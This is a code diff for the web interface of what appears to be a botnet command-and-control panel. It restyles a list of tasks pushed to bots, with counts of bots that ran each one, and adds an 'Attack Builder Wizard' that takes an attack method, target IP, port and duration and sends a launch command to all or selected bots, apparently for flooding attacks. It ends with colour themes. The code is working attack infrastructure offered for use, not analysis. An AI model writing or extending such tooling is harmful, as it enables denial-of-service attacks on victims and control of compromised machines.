@@ -1231,33 +1231,43 @@ function renderTaskTable(tasks) {
   var active = tasks.filter(function (t) { return !t.expired; });
   var tabCount = document.getElementById('tab-tasks-count');
   if (tabCount) tabCount.textContent = active.length;
+  var activeCount = document.getElementById('task-active-count');
+  if (activeCount) activeCount.textContent = active.length;
   if (!tasks || !tasks.length) {
-    wrap.innerHTML = '<div class="no-bots">No active tasks. Use the bar above to add one.</div>';
+    wrap.innerHTML = '<div class="task-empty">No active tasks. Create one above.</div>';
     return;
   }
-  var html = '<table class="socks-dash-table"><thead><tr><th>Command</th><th>Mode</th><th>Created</th><th>Expires</th><th>Executed</th><th>Status</th><th></th></tr></thead><tbody>';
+  var html = '';
   tasks.forEach(function (t) {
-    var mode = t.runOnce ? '<span style="color:var(--accent)">Run Once</span>' : '<span style="color:var(--blue)">Every Join</span>';
+    var isExpired = t.expired;
+    var dotClass = isExpired ? 'expired' : 'active';
+    var badgeClass = t.runOnce ? 'once' : 'every';
+    var badgeText = t.runOnce ? 'Run Once' : 'Every Join';
     var created = new Date(t.createdAt);
-    var createdStr = ('0' + created.getHours()).slice(-2) + ':' + ('0' + created.getMinutes()).slice(-2) + ':' + ('0' + created.getSeconds()).slice(-2);
-    var expiresStr = t.expiresAt ? ago(t.expiresAt) : '<span style="color:var(--text-dim)">never</span>';
-    if (t.expiresAt && !t.expired) {
+    var createdStr = ('0' + created.getHours()).slice(-2) + ':' + ('0' + created.getMinutes()).slice(-2);
+    var expiresStr = 'never';
+    if (t.expiresAt && !isExpired) {
       var exp = new Date(t.expiresAt);
       var remaining = Math.max(0, Math.floor((exp - Date.now()) / 1000));
       if (remaining > 3600) expiresStr = Math.floor(remaining / 3600) + 'h ' + Math.floor((remaining % 3600) / 60) + 'm';
       else if (remaining > 60) expiresStr = Math.floor(remaining / 60) + 'm ' + (remaining % 60) + 's';
       else expiresStr = remaining + 's';
+    } else if (isExpired) {
+      expiresStr = 'expired';
     }
-    var status = t.expired ? '<span style="color:var(--text-dim)">expired</span>' : '<span style="color:var(--green)">active</span>';
-    html += '<tr' + (t.expired ? ' style="opacity:0.5"' : '') + '><td style="font-family:monospace;color:var(--blue)">' + escHtml(t.command) + '</td>' +
-      '<td>' + mode + '</td>' +
-      '<td>' + createdStr + '</td>' +
-      '<td>' + expiresStr + '</td>' +
-      '<td>' + t.executed + ' bots</td>' +
-      '<td>' + status + '</td>' +
-      '<td><button class="socks-stop-btn" onclick="deleteTask(\'' + escHtml(t.id) + '\')">Remove</button></td></tr>';
+    html += '<div class="task-card' + (isExpired ? ' expired' : '') + '">' +
+      '<div class="task-status-dot ' + dotClass + '"></div>' +
+      '<div class="task-cmd" title="' + escHtml(t.command) + '">' + escHtml(t.command) + '</div>' +
+      '<div class="task-meta">' +
+        '<span class="task-badge ' + badgeClass + '">' + badgeText + '</span>' +
+        '<span class="task-meta-item"><span class="task-meta-label">created</span> ' + createdStr + '</span>' +
+        '<span class="task-meta-item"><span class="task-meta-label">TTL</span> ' + expiresStr + '</span>' +
+        '<span class="task-meta-item"><span class="task-meta-label">ran on</span> ' + t.executed + ' bots</span>' +
+      '</div>' +
+      '<button class="task-remove" onclick="deleteTask(\'' + escHtml(t.id) + '\')">Stop</button>' +
+    '</div>';
   });
-  wrap.innerHTML = html + '</tbody></table>';
+  wrap.innerHTML = html;
 }
 
 function addTask() {
@@ -2033,9 +2043,7 @@ function toggleCompactMode() {
 
 function toggleCmdBar() {
   var bar = document.getElementById('cmd-bar');
-  var btn = bar.querySelector('.cmd-toggle');
   bar.classList.toggle('collapsed');
-  btn.classList.toggle('active', !bar.classList.contains('collapsed'));
   lsSet('cmdCollapsed', bar.classList.contains('collapsed'));
 }
 
@@ -2573,3 +2581,164 @@ if(typeof saveUser==='undefined')window.saveUser=function(){};
 if(typeof showAddUserForm==='undefined')window.showAddUserForm=function(){};
 if(typeof hideUserForm==='undefined')window.hideUserForm=function(){};
 if(typeof updateTaskArgFields==='undefined')window.updateTaskArgFields=function(){};
+
+// ===========================================================================
+// ATTACK BUILDER WIZARD
+// ===========================================================================
+var wizState = { step: 1, method: null, methods: [] };
+
+function wizardInit() {
+  fetch('/api/attack-methods').then(function(r) { return r.json(); }).then(function(methods) {
+    wizState.methods = methods;
+    var grid = document.getElementById('wiz-method-grid');
+    if (!grid) return;
+    grid.innerHTML = '';
+    methods.forEach(function(m) {
+      var card = document.createElement('div');
+      card.className = 'method-card';
+      card.innerHTML = '<div class="mc-name">' + escHtml(m.name) + '</div><div class="mc-cat">' + escHtml(m.category) + '</div><div class="mc-desc">' + escHtml(m.desc) + '</div>';
+      card.onclick = function() {
+        wizState.method = m;
+        grid.querySelectorAll('.method-card').forEach(function(c) { c.classList.remove('selected'); });
+        card.classList.add('selected');
+      };
+      grid.appendChild(card);
+    });
+  }).catch(function() {});
+}
+
+function wizardNext() {
+  if (wizState.step === 1 && !wizState.method) { showToast('Select a method', false); return; }
+  if (wizState.step === 2) {
+    var t = document.getElementById('wiz-target').value.trim();
+    if (!t) { showToast('Enter a target IP', false); return; }
+  }
+  if (wizState.step === 3) {
+    wizState.options = {};
+    var c = document.getElementById('wiz-options-container');
+    if (c) c.querySelectorAll('input[data-key]').forEach(function(el) {
+      if (el.value && el.value !== el.getAttribute('data-default')) wizState.options[el.getAttribute('data-key')] = el.value;
+    });
+  }
+  wizState.step = Math.min(wizState.step + 1, 4);
+  renderWizStep();
+  if (wizState.step === 3) renderWizOpts();
+  if (wizState.step === 4) renderWizReview();
+}
+
+function wizardBack() { wizState.step = Math.max(wizState.step - 1, 1); renderWizStep(); }
+
+function renderWizStep() {
+  for (var i = 1; i <= 4; i++) {
+    var p = document.getElementById('wiz-step-' + i);
+    if (p) p.classList.toggle('active', i === wizState.step);
+  }
+  document.querySelectorAll('.wizard-step').forEach(function(el) {
+    var s = parseInt(el.getAttribute('data-step'));
+    el.classList.toggle('active', s === wizState.step);
+    el.classList.toggle('done', s < wizState.step);
+  });
+  var b = document.getElementById('wiz-back'), n = document.getElementById('wiz-next'), l = document.getElementById('wiz-launch');
+  if (b) b.style.display = wizState.step > 1 ? '' : 'none';
+  if (n) n.style.display = wizState.step < 4 ? '' : 'none';
+  if (l) l.style.display = wizState.step === 4 ? '' : 'none';
+}
+
+function renderWizOpts() {
+  var c = document.getElementById('wiz-options-container');
+  if (!c || !wizState.method) return;
+  var opts = wizState.method.options || [];
+  if (!opts.length) { c.innerHTML = '<div style="color:var(--text-dim);padding:12px">No advanced options for this method</div>'; return; }
+  c.innerHTML = '<p style="color:var(--text-dim);font-size:13px;margin-bottom:12px">Options for ' + escHtml(wizState.method.name) + ':</p>';
+  opts.forEach(function(o) {
+    var row = document.createElement('div'); row.className = 'wiz-form-row';
+    row.innerHTML = '<label>' + escHtml(o.label) + '</label><input type="text" data-key="' + escHtml(o.key) + '" data-default="' + escHtml(o['default']||'') + '" value="' + escHtml(o['default']||'') + '" placeholder="' + escHtml(o.tooltip||'') + '">';
+    c.appendChild(row);
+  });
+}
+
+function renderWizReview() {
+  var r = document.getElementById('wiz-review'); if (!r) return;
+  var target = document.getElementById('wiz-target').value.trim();
+  var port = document.getElementById('wiz-port').value.trim() || '80';
+  var dur = parseInt(document.getElementById('wiz-duration-val').value) || 120;
+  var bot = (document.getElementById('wiz-bot-target') || {}).value || '';
+  var html = '<div class="wr-row"><span class="wr-label">Method</span><span class="wr-value">' + escHtml(wizState.method.name) + '</span></div>' +
+    '<div class="wr-row"><span class="wr-label">Target</span><span class="wr-value">' + escHtml(target) + ':' + escHtml(port) + '</span></div>' +
+    '<div class="wr-row"><span class="wr-label">Duration</span><span class="wr-value">' + dur + 's</span></div>' +
+    '<div class="wr-row"><span class="wr-label">Scope</span><span class="wr-value">' + (bot || 'ALL bots') + '</span></div>';
+  var ok = wizState.options || {};
+  var keys = Object.keys(ok);
+  if (keys.length) html += '<div class="wr-row"><span class="wr-label">Options</span><span class="wr-value">' + keys.map(function(k) { return k+'='+ok[k]; }).join(', ') + '</span></div>';
+  r.innerHTML = html;
+}
+
+function wizardLaunch() {
+  var target = document.getElementById('wiz-target').value.trim();
+  var port = document.getElementById('wiz-port').value.trim() || '80';
+  var dur = document.getElementById('wiz-duration-val').value || '120';
+  var bot = (document.getElementById('wiz-bot-target') || {}).value || '';
+  var cmd = '!' + wizState.method.id + ' ' + target + ' ' + port + ' ' + dur;
+  var opts = wizState.options || {};
+  Object.keys(opts).forEach(function(k) { cmd += ' ' + k + '=' + opts[k]; });
+  fetch('/api/command', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ command: cmd, botID: bot })
+  }).then(function(r) { return r.json(); }).then(function(d) {
+    if (d.success) { showToast('Attack launched: ' + d.message, true); wizState.step = 1; wizState.method = null; renderWizStep(); wizardInit(); }
+    else showToast(d.message || 'Failed', false);
+  }).catch(function() { showToast('Request failed', false); });
+}
+
+wizardInit();
+
+// ===========================================================================
+// GLOBAL PANEL THEMES
+// ===========================================================================
+var GLOBAL_THEMES = {
+  default:   { name:'Default (Dark)',  bgBase:'#06080c', bgPrimary:'#0c1018', bgCard:'#111827', bgCardHover:'#1a2332', bgInput:'#0f1520', bgElevated:'#182234', border:'#1e2d3d', borderLight:'#253344', text:'#e2e8f0', textMuted:'#64748b', textDim:'#475569', accent:'#8b5cf6', accentHover:'#7c3aed', green:'#22c55e', red:'#ef4444', yellow:'#eab308', blue:'#3b82f6', cyan:'#06b6d4', headerBg:'rgba(12,16,24,0.8)' },
+  monokai:   { name:'Monokai',         bgBase:'#1a1a17', bgPrimary:'#272822', bgCard:'#2e2f28', bgCardHover:'#3a3b32', bgInput:'#1e1f1a', bgElevated:'#3e3d32', border:'#49483e', borderLight:'#5a5949', text:'#f8f8f2', textMuted:'#a59f85', textDim:'#75715e', accent:'#f92672', accentHover:'#e6195f', green:'#a6e22e', red:'#f92672', yellow:'#e6db74', blue:'#66d9ef', cyan:'#a1efe4', headerBg:'rgba(39,40,34,0.9)' },
+  dracula:   { name:'Dracula',         bgBase:'#1e1f29', bgPrimary:'#282a36', bgCard:'#2d2f3d', bgCardHover:'#343746', bgInput:'#21222c', bgElevated:'#383a4a', border:'#44475a', borderLight:'#555869', text:'#f8f8f2', textMuted:'#8a8ea0', textDim:'#6272a4', accent:'#bd93f9', accentHover:'#a87cf5', green:'#50fa7b', red:'#ff5555', yellow:'#f1fa8c', blue:'#8be9fd', cyan:'#8be9fd', headerBg:'rgba(40,42,54,0.9)' },
+  solarized: { name:'Solarized Dark',  bgBase:'#001e26', bgPrimary:'#002b36', bgCard:'#073642', bgCardHover:'#0a4050', bgInput:'#002028', bgElevated:'#0a4050', border:'#2a5a68', borderLight:'#3a6a78', text:'#839496', textMuted:'#657b83', textDim:'#586e75', accent:'#268bd2', accentHover:'#1a7ab8', green:'#859900', red:'#dc322f', yellow:'#b58900', blue:'#268bd2', cyan:'#2aa198', headerBg:'rgba(0,43,54,0.9)' },
+  nord:      { name:'Nord',            bgBase:'#242933', bgPrimary:'#2e3440', bgCard:'#3b4252', bgCardHover:'#434c5e', bgInput:'#2a303c', bgElevated:'#434c5e', border:'#4c566a', borderLight:'#5c6678', text:'#d8dee9', textMuted:'#9ba4b5', textDim:'#7b849a', accent:'#88c0d0', accentHover:'#7ab3c3', green:'#a3be8c', red:'#bf616a', yellow:'#ebcb8b', blue:'#81a1c1', cyan:'#88c0d0', headerBg:'rgba(46,52,64,0.9)' },
+  matrix:    { name:'Matrix',          bgBase:'#030503', bgPrimary:'#0a0a0a', bgCard:'#0f120f', bgCardHover:'#151a15', bgInput:'#060806', bgElevated:'#151a15', border:'#1a2e1a', borderLight:'#254025', text:'#00ff41', textMuted:'#00aa2a', textDim:'#007718', accent:'#00ff41', accentHover:'#33ff66', green:'#00ff41', red:'#ff0000', yellow:'#33ff66', blue:'#00cc33', cyan:'#33ff66', headerBg:'rgba(10,10,10,0.9)' }
+};
+
+function applyGlobalTheme(name) {
+  var t = GLOBAL_THEMES[name]; if (!t) return;
+  var r = document.documentElement;
+  r.removeAttribute('data-theme');
+  r.style.setProperty('--bg-base', t.bgBase);
+  r.style.setProperty('--bg-primary', t.bgPrimary);
+  r.style.setProperty('--bg-card', t.bgCard);
+  r.style.setProperty('--bg-card-hover', t.bgCardHover);
+  r.style.setProperty('--bg-input', t.bgInput);
+  r.style.setProperty('--bg-elevated', t.bgElevated);
+  r.style.setProperty('--border', t.border);
+  r.style.setProperty('--border-light', t.borderLight);
+  r.style.setProperty('--text', t.text);
+  r.style.setProperty('--text-muted', t.textMuted);
+  r.style.setProperty('--text-dim', t.textDim);
+  r.style.setProperty('--accent', t.accent);
+  r.style.setProperty('--accent-hover', t.accentHover);
+  r.style.setProperty('--green', t.green);
+  r.style.setProperty('--red', t.red);
+  r.style.setProperty('--yellow', t.yellow);
+  r.style.setProperty('--blue', t.blue);
+  r.style.setProperty('--cyan', t.cyan);
+  r.style.setProperty('--header-bg', t.headerBg);
+  document.body.style.background = t.bgBase;
+  localStorage.setItem('vision_global_theme', name);
+}
+
+(function() {
+  var picker = document.getElementById('global-theme-picker');
+  if (!picker) return;
+  Object.keys(GLOBAL_THEMES).forEach(function(key) {
+    var opt = document.createElement('option');
+    opt.value = key; opt.textContent = GLOBAL_THEMES[key].name;
+    picker.appendChild(opt);
+  });
+  var saved = localStorage.getItem('vision_global_theme');
+  if (saved && GLOBAL_THEMES[saved]) { picker.value = saved; applyGlobalTheme(saved); }
+})();
